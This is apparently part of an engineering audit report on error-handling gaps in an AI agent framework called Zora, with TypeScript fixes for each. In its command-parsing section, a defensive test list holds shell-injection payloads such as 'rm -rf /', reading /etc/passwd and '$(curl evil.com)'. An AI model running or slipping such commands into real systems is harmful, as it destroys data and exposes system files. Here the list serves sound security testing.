## 8. ERROR HANDLING GAPS (6 gaps)

### Root Cause Analysis

**Problem:** The Zora framework has silent failures in security-critical and core operational paths. Error handling either swallows exceptions completely, classifies errors too simplistically, or lacks timeout protection on critical operations. These gaps create data loss risks (audit logs, tool invocations), operational blindness, and production availability risks.

**Risk Profile:**
- **Immediate (S1):** Audit logs and tool invocations silently lost; data loss undetectable
- **Operational (S2):** Steering flags ignored invisibly; event streams hang indefinitely; error handling fails across provider variants
- **Security (S3):** Shell command parsing has edge cases that bypass security restrictions
- **Observability:** Configuration failures completely hidden; errors impossible to diagnose

---

#### ERR-01: AuditLogger Silent Write Failures

**Severity:** S1 (Critical)
**Effort:** 1h
**Blocking:** Yes
**Category:** SECURITY-CRITICAL
**Files Affected:** 1
**Impact Level:** 5/5

**Description:**

The AuditLogger implements empty catch blocks that silently swallow write failures at a critical juncture:

```typescript
// Problematic code at security/audit-logger.ts:52
.catch(() => {})  // Silent failure - no logging, no retry, no alerting
```

When audit log writes fail (due to disk space, permission errors, database connection loss, filesystem errors, etc.), the errors are completely suppressed without any notification mechanism. This creates cascading risks:

**Specific Failure Modes:**
- Disk full: Audit writes fail silently; compliance violation undetected
- Permission error: Audit subsystem non-functional; no alerting
- Network loss (remote audit): Audit trail permanently incomplete
- Corruption during write: Data loss hidden indefinitely

**Impact Assessment:**
- **Data Loss Risk:** CRITICAL - Audit events vanish without trace, violating audit trail integrity
- **Compliance Impact:** CRITICAL - Violates SOC2, HIPAA, GDPR audit logging requirements
- **Operational Impact:** SEVERE - SRE has no visibility into audit subsystem health; cannot intervene
- **Security Impact:** Undetectable security incidents cannot be retrospectively investigated

**Recommended Solution:**

1. **Replace empty catch with structured error handling:**
   ```typescript
   .catch((err) => {
     // Log to fallback system (stderr, file, metrics)
     const errMsg = err instanceof Error ? err.message : String(err);
     console.error(`[AUDIT_CRITICAL] Write failed: ${errMsg}`);

     // Emit metric/alert
     metrics.increment('audit.write_failures');
     alerting.critical('AuditLogger write failure', { error: errMsg });

     // Implement exponential backoff retry
     if (this.retryCount < MAX_RETRIES) {
       setTimeout(() => retryWrite(), Math.pow(2, this.retryCount) * 1000);
     }
   })
   ```

2. **Implement dual-write for critical audit events:**
   - Primary write to main audit storage
   - Secondary write to fallback storage (file, syslog)
   - Emit both succeed/fail outcomes

3. **Add circuit breaker pattern:**
   - After N consecutive failures, halt operations and alert
   - Prevent cascade of lost audit events

4. **Operational dashboard:**
   - Monitor audit subsystem health
   - Track write latency and failure rates
   - Alert on degraded performance

**Success Criteria:**
- All audit write errors logged with full context (timestamp, error details)
- Alert fired within 30s of first failure
- Zero silent failures in audit write path
- Audit subsystem health queryable via metrics/status endpoint

**Verification:**
- Integration tests verify errors are logged and metricated
- Operational monitoring confirms alerts fire on write failures
- No unhandled promise rejections in audit path

---

#### ERR-02: GeminiProvider Silent JSON Parse Failures

**Severity:** S1 (Critical)
**Effort:** 1h
**Blocking:** Yes
**Category:** DATA LOSS
**Files Affected:** 1
**Impact Level:** 5/5

**Description:**

The GeminiProvider discards malformed JSON responses in empty catch blocks at multiple critical points:

```typescript
// Problematic code at gemini-provider.ts:256, 272
try {
  const parsed = JSON.parse(response);
  // process parsed tool invocation
} catch (e) {
  // Silent failure - tool invocation completely lost
}
```

When the Gemini API returns malformed JSON (corrupted response, streaming error, encoding issue, truncated payload, API version change), the error is silently swallowed and:

**Specific Failure Modes:**
- Streaming timeout: Partial JSON dropped; no error event
- Encoding issue: Invalid UTF-8 silently fails to parse
- API version mismatch: Expected JSON structure changed; parse fails
- Network corruption: Response truncated mid-stream; invalid JSON
- Tool call response: Invocation lost; user work disappears

**Impact Assessment:**
- **Functional Impact:** CRITICAL - Core functionality (tool invocation) broken
- **User Impact:** SEVERE - Tool calls silently disappear; users unaware requests failed
- **Data Loss:** Tool results never received; work permanently lost
- **Debug Difficulty:** Impossible to diagnose without detailed logging; appears to work but produces nothing
- **Scale of Impact:** Every tool call failure is invisible; users have no feedback

**Recommended Solution:**

1. **Replace empty catch blocks with structured error handling:**
   ```typescript
   let toolCall: unknown;
   try {
     toolCall = JSON.parse(response);
   } catch (err) {
     const errMsg = err instanceof Error ? err.message : String(err);
     this.emit('error', {
       type: 'parse_error',
       message: `Failed to parse JSON from Gemini: ${errMsg}`,
       rawContent: response.slice(0, 500), // Log first 500 chars for diagnosis
       source: 'gemini-provider',
       timestamp: Date.now()
     });
     logger.error(`GeminiProvider JSON parse failed: ${errMsg}`, {
       rawResponse: response.slice(0, 500)
     });
     return; // Don't process further
   }
   ```

2. **Add strict validation of JSON structure:**
   ```typescript
   // Validate structure before use
   function isValidToolCall(value: unknown): value is ToolCall {
     return (
       typeof value === 'object' &&
       value !== null &&
       'tool' in value &&
       'args' in value &&
       typeof (value as any).tool === 'string' &&
       typeof (value as any).args === 'object'
     );
   }

   if (!isValidToolCall(toolCall)) {
     this.emit('error', {
       type: 'invalid_tool_call',
       message: 'Parsed JSON did not match ToolCall schema',
       payload: toolCall,
       source: 'gemini-provider'
     });
     return;
   }
   ```

3. **Emit detailed observability:**
   - Metrics: parse_errors, invalid_schema errors per provider
   - Traces: full request/response cycle including raw payload
   - Logs: JSON parse errors with context for debugging

4. **Implement error propagation to retry/failover:**
   - Errors must bubble up to FailoverController
   - Allows retry with alternate provider
   - Never silently drop invocations

**Success Criteria:**
- No silent failures in JSON parsing path
- 100% of parse errors logged with full context and raw content
- Tool invocations never lost without notification
- Errors propagate to caller for retry/failover handling
- Integration tests confirm error events emitted for malformed JSON

**Verification:**
- Zero `catch { }` blocks in GeminiProvider (all errors logged)
- End-to-end tests with malformed responses confirm error events fire
- Audit logs show parse failures with raw content for diagnosis
- Monitoring dashboard tracks parse errors by type

---

#### ERR-03: FlagManager Silently Skips Corrupted Files

**Severity:** S2 (High)
**Effort:** 1h
**Blocking:** No
**Category:** OBSERVABILITY
**Files Affected:** 1
**Impact Level:** 4/5

**Description:**

The FlagManager implements four separate catch blocks that swallow file loading errors without any logging or context:

```typescript
// Pattern repeated at steering/flag-manager.ts:96, 102, 132, 188
try {
  // load and parse config file
  const config = readFileSync(path, 'utf-8');
  const parsed = JSON.parse(config);
  // merge into flags
} catch (e) {
  // Silent failure - no logging, no context, no indication
}
```

When configuration files are corrupted, missing, unreadable, or contain invalid JSON, errors are completely hidden from operators and developers:

**Specific Failure Modes:**
- File not found: Optional config silently ignored (expected) or required config missing (critical)
- File unreadable: Permission issue unknown to SRE
- Invalid JSON: Config partially loaded; flags in inconsistent state
- Encoding error: UTF-8 file with invalid encoding silently fails

**Impact Assessment:**
- **Observability Impact:** HIGH - Configuration errors completely hidden
- **Operational Impact:** SEVERE - Troubleshooting becomes guesswork; steering flags mysteriously ignored
- **System Reliability:** UNKNOWN - Configuration state non-deterministic
- **Startup Health:** No indication if system started with complete configuration

**Recommended Solution:**

1. **Implement comprehensive logging in all four catch blocks:**
   ```typescript
   try {
     const config = readFileSync(filePath, 'utf-8');
     const parsed = JSON.parse(config);
     return parsed;
   } catch (err) {
     const errMsg = err instanceof Error ? err.message : String(err);
     const errorType = err instanceof SyntaxError ? 'parse_error' : 'read_error';

     logger.warn(`FlagManager: Failed to load config file`, {
       path: filePath,
       errorType,
       error: errMsg,
       timestamp: Date.now()
     });

     // Emit diagnostic event for observability
     this.diagnostics.push({
       file: filePath,
       status: 'failed',
       reason: errMsg,
       timestamp: Date.now()
     });

     // For required files, throw; for optional, return default
     if (this.isRequired(filePath)) {
       throw new Error(`Required flag file missing: ${filePath}`);
     }
     return null; // Optional file not found
   }
   ```

2. **Classify errors by type:**
   - File not found (benign if optional, critical if required)
   - File unreadable (permission issue - operational)
   - File corrupted (JSON parse error - data quality)
   - File valid but config invalid (schema error - configuration)

3. **Add health checks and diagnostics:**
   ```typescript
   getConfigStatus(): ConfigStatus {
     return {
       filesLoaded: this.successCount,
       filesFailed: this.failureCount,
       failedFiles: this.diagnostics.filter(d => d.status === 'failed'),
       timestamp: Date.now()
     };
   }
   ```

4. **Emit startup diagnostics:**
   - Log final state of all loaded configs
   - Log all files that failed to load with reasons
   - Make config status queryable via API/CLI
   - Display on dashboard

**Success Criteria:**
- All config load failures logged with full context (path, error, error type)
- Configuration diagnostics available via API/CLI query
- Zero configuration errors without logged explanation
- Startup log includes summary of config loading results
- Steering flags always reflect actual configuration state

**Verification:**
- Integration tests verify logging for each error type
- Health check API returns configuration status
- Startup logs reviewed for completeness in test environment

---

#### ERR-04: Fragile Error Classification via String Matching

**Severity:** S2 (High)
**Effort:** 2h
**Blocking:** Medium
**Category:** RELIABILITY
**Files Affected:** 1
**Impact Level:** 3/5

**Description:**

The FailoverController classifies errors using brittle string matching on error messages, which fails across provider variants and API version changes:

```typescript
// Fragile pattern at orchestrator/failover-controller.ts:132-141
if (error.message.toLowerCase().includes('rate_limit')) {
  // handle rate limit quota
  return ErrorCategory.RATE_LIMIT;
} else if (error.message.toLowerCase().includes('quota')) {
  // handle quota exceeded
  return ErrorCategory.QUOTA;
} else if (error.message.toLowerCase().includes('auth')) {
  // handle authentication failure
  return ErrorCategory.AUTH;
}
```

This approach has multiple critical failure modes:

**Specific Failure Modes:**
- **Provider Variation:** Different providers use different error formats
  - Gemini: `"Rate limit exceeded (429)"`
  - OpenAI: `"quota_exceeded"`
  - Claude: `"rate_limit_error"`
  - Custom providers: Arbitrary message formats

- **Message Instability:** Error messages change between API versions
  - Breaking changes in provider error messages go undetected
  - False negatives: Actual quota errors with different wording not detected

- **False Positives:** "limit" substring matches in unrelated errors
  - "You have reached the maximum item limit in your library" (not rate limit)
  - "Credential token limited to 100 characters" (not auth failure)

- **False Negatives:** Important errors misclassified or missed
  - Quota errors appear as general errors; failover not triggered
  - Auth errors appear as transient; retry wasted on permanent failures

**Impact Assessment:**
- **Failover Accuracy:** HIGH - Error classification directly controls failover behavior
- **Reliability Impact:** SEVERE - Quota handling broken across providers
- **User Experience:** Requests fail unnecessarily when alternate providers available
- **Resource Waste:** Retrying non-transient errors wastes quota

**Recommended Solution:**

1. **Create structured error classification system:**
   ```typescript
   interface ClassifiedError {
     category: 'rate_limit' | 'quota' | 'auth' | 'timeout' | 'transient' | 'permanent' | 'unknown';
     retryable: boolean;
     provider: 'gemini' | 'claude' | 'openai';
     httpStatus?: number;
     errorCode?: string;
     originalMessage: string;
     confidence: 'high' | 'medium' | 'low';
     details: Record<string, unknown>;
   }
   ```

2. **Create provider-specific error parsers:**
   ```typescript
   class GeminiErrorClassifier {
     classify(error: unknown): ClassifiedError {
       // Parse Gemini-specific error codes
       if (error.code === 429 || error.status === 429) {
         return { category: 'rate_limit', retryable: true, ... };
       }
       if (error.code === 'RESOURCE_EXHAUSTED') {
         return { category: 'quota', retryable: false, ... };
       }
       // Parse headers for retry-after, quota info
       return this.fallbackClassify(error);
     }
   }
   ```

3. **Implement multi-signal classification:**
   - Check error code (not just message)
   - Extract details from response headers
   - Parse nested error structures
   - Vendor-specific status codes
   - HTTP status codes

4. **Add error registry with versioning:**
   ```typescript
   interface ErrorDefinition {
     provider: string;
     apiVersion: string;
     errorCodes: string[];
     messagePatterns: RegExp[];
     category: ErrorCategory;
     retryable: boolean;
   }
   ```

5. **Comprehensive error testing:**
   - Test each provider's error variants
   - Test message format changes across versions
   - Test edge cases and false positives
   - Automated regression tests for error classification

**Success Criteria:**
- 100% accuracy on known error types across all providers
- Failover triggered correctly for rate limit/quota errors
- No false positive/negative classifications in test matrix
- Error classification logged for audit and debugging
- Each classification decision documented with reasoning

**Verification:**
- Test suite includes errors from each provider's documentation
- Classification accuracy verified for 50+ error scenarios
- Integration tests confirm failover triggered on rate limit
- Regression tests run on provider updates

---

#### ERR-05: No Timeout on Event Streams

**Severity:** S2 (High)
**Effort:** 1h
**Blocking:** Medium
**Category:** PRODUCTION RISK
**Files Affected:** 1
**Impact Level:** 4/5

**Description:**

The execution loop consumes provider event streams without timeout protection, allowing a single hung stream to block the entire orchestrator indefinitely:

```typescript
// Problematic pattern in orchestrator/execution-loop.ts
for await (const event of provider.execute()) {
  // No timeout - if stream hangs, blocks indefinitely
  processEvent(event);
}
```

If a provider's event stream hangs (network issue, provider timeout, stream corruption, connection reset, etc.), the entire execution loop blocks indefinitely with catastrophic consequences:

**Specific Failure Modes:**
- Network hang: Stream stops receiving events; for-await blocks forever
- Provider timeout: Provider stops sending events; stream never closes
- Connection reset: Connection lost mid-stream; no close event fired
- Backpressure: Consumer slower than producer; queue grows unbounded
- Partial event: Stream sends incomplete event; parser waits for more data

**Impact Assessment:**
- **Availability Impact:** CRITICAL - Single hung stream takes entire system offline
- **Operational Impact:** SEVERE - Manual restart required; no automatic recovery
- **Production Risk:** EXTREME - Framework completely unavailable; no graceful degradation
- **Task Impact:** All pending and future tasks blocked until restart

**Recommended Solution:**

1. **Implement AbortController-based timeout:**
   ```typescript
   async function executeWithTimeout(provider: LLMProvider, task: Task) {
     const timeout = new AbortController();
     const configuredTimeout = task.timeout || config.defaultStreamTimeout; // 30min default

     let timeoutHandle = setTimeout(
       () => timeout.abort(),
       configuredTimeout
     );

     try {
       for await (const event of provider.execute({ signal: timeout.signal })) {
         // Reset timeout on each event (stream is alive)
         clearTimeout(timeoutHandle);
         timeoutHandle = setTimeout(
           () => timeout.abort(),
           configuredTimeout
         );

         processEvent(event);
       }
     } catch (err) {
       if (err instanceof DOMException && err.name === 'AbortError') {
         // Timeout occurred
         this.emit('timeout', {
           taskId: task.id,
           duration: configuredTimeout,
           lastEvent: lastEventTime
         });

         // Trigger failover or retry
         return this.failover.handle(task);
       }
       throw err;
     } finally {
       clearTimeout(timeoutHandle);
     }
   }
   ```

2. **Add configurable timeout per provider/task:**
   ```typescript
   interface ExecutionOptions {
     streamTimeout?: number;  // milliseconds
     eventTimeout?: number;   // timeout between events
     maxDuration?: number;    // maximum total execution time
   }
   ```
   - Default: 30 minutes (standard for long-running operations)
   - Configurable via task parameters
   - Documented timeout expectations for each provider

3. **Implement graceful degradation:**
   - Emit timeout event to system
   - Trigger fallback provider
   - Preserve partial results collected so far
   - Attempt retry with exponential backoff
   - Increment timeout for retry (adaptive)

4. **Add monitoring and alerting:**
   - Track stream duration and timeout counts
   - Alert on repeated timeouts (indicates provider/network issue)
   - Monitor hung streams before timeout (track age)
   - Dashboard visualization of execution time distribution

**Success Criteria:**
- All event streams have timeout protection enabled
- Hung streams recovered automatically within configured timeout
- No indefinite daemon blocking even with provider failures
- Timeout behavior documented and configurable
- Monitoring alerts on timeout patterns

**Verification:**
- Integration tests with intentionally hung provider confirm timeout fires
- Failover triggered on timeout
- Partial results preserved after timeout
- Configuration changes applied without code changes

---

#### ERR-06: Command Parsing Regex Incomplete

**Severity:** S3 (Medium)
**Effort:** 2h
**Blocking:** No
**Category:** SECURITY
**Files Affected:** 1
**Impact Level:** 3/5

**Description:**

The security policy engine uses regex-based shell command parsing that doesn't handle all edge cases of shell quoting and escaping:

```typescript
// Incomplete regex parsing at security/policy-engine.ts
const commandRegex = /["']([^"']*?)["']/g;
// Fails to handle:
// - Nested quotes: "foo 'bar' baz"
// - Quote escaping: "foo \"bar\" baz"
// - Backslash escaping: 'foo\\bar'
// - Empty strings: "" or ''
// - Multiline strings in some shells
```

Quote-aware shell parsing is notoriously complex due to shell semantics across different shells (bash, sh, zsh, etc.):

**Specific Failure Modes:**
- **Nested Quotes:** Single quotes inside double quotes: `"foo 'bar' baz"` — regex splits incorrectly
- **Escape Sequences:** `\"`, `\'`, `\\` patterns — not recognized; parsed as part of content
- **Empty Strings:** `""` and `''` — may be ignored by regex
- **Whitespace:** Quoted whitespace: `"foo bar"` — splits on internal spaces if not properly tracked
- **Quote Variety:** Backticks, `$()` syntax — not handled
- **Edge Cases:** Unicode quotes, alternative quote styles in different shells

**Impact Assessment:**
- **Security Impact:** MEDIUM - Potential bypass of command restrictions
- **Reliability Impact:** Medium - Inconsistent command parsing across inputs
- **Edge Cases:** Rare but exploitable scenarios may bypass security checks
- **Maintenance:** Security boundary unclear; future changes risk introducing bypasses

**Recommended Solution:**

1. **Audit current regex thoroughly:**
   ```typescript
   // Document all supported patterns
   const SUPPORTED_PATTERNS = [
     'simple: cmd arg',
     'quoted: cmd "arg with spaces"',
     'single: cmd \'arg\'',
     // Document NOT supported:
     'nested quotes',
     'escape sequences',
     'unicode quotes'
   ];
   ```

   - Create comprehensive test matrix
   - Test against OWASP shell injection payloads
   - Identify specific edge cases not handled
   - Document all assumptions and limitations

2. **Option A - Use established shell parser library:**
   ```typescript
   // Example: use shellwords or similar
   import * as shellwords from 'shellwords';

   const tokens = shellwords.split(commandString);
   // Proper shell semantics; reduces custom parsing complexity
   ```

   - `shellwords` npm package (implements POSIX shell)
   - Reduces custom parsing complexity
   - Leverages community testing and fixes

3. **Option B - Comprehensive regex with validation:**
   - Expand regex to cover documented edge cases
   - Implement state machine for quote tracking
   - Add comprehensive test suite
   - Document all assumptions and limitations
   - Regular audit against new shell injection techniques

4. **Option C - Safer command model:**
   - Accept commands as structured data (not strings)
   - Define allowed command patterns upfront
   - Eliminate ad-hoc parsing entirely
   - Stronger security boundary

5. **Add security test suite:**
   ```typescript
   const INJECTION_PAYLOADS = [
     'cmd; rm -rf /',
     'cmd && malicious',
     'cmd | cat /etc/passwd',
     'cmd `echo pwned`',
     'cmd $(curl evil.com)',
     'cmd"; break "out'
   ];

   INJECTION_PAYLOADS.forEach(payload => {
     test(`safely rejects: ${payload}`, () => {
       const parsed = parseCommand(payload);
       assert(!parsed.containsInjection);
     });
   });
   ```

   - Common shell injection payloads
   - Quote escaping variations
   - Unicode and encoding edge cases
   - Automated security regression tests

**Success Criteria:**
- All identified edge cases documented
- Zero failures on comprehensive test matrix (50+ scenarios)
- Security audit completed against OWASP shell injection patterns
- Approved parsing implementation documented with safety guarantees
- Regression test suite prevents future bypasses

**Verification:**
- Security team reviews and approves solution
- Penetration testing confirms no injection bypasses
- Regression tests run on any parsing changes

---

### Summary Table: Error Handling Gaps

| Gap ID | Issue | Risk Level | Effort | Blocking | Priority |
|--------|-------|-----------|--------|----------|----------|
| **ERR-01** | AuditLogger silent write failures | Data loss | 1h | Yes | P0 |
| **ERR-02** | GeminiProvider silent JSON parse | Data loss | 1h | Yes | P0 |
| **ERR-03** | FlagManager missing logging | Observability | 1h | No | P1 |
| **ERR-04** | Fragile error classification | Failover broken | 2h | Medium | P1 |
| **ERR-05** | No event stream timeout | Availability risk | 1h | Medium | P1 |
| **ERR-06** | Incomplete command parsing regex | Security edge case | 2h | No | P2 |

**Total Effort:** 9 hours
**Critical Path (P0):** 2 hours
**Production Blockers:** 3 gaps (ERR-01, ERR-02, ERR-05)

**Parallelization:** All P0 gaps can be worked in parallel; P1 gaps independent except ERR-04 (depends on error classification improvement in FailoverController)

---

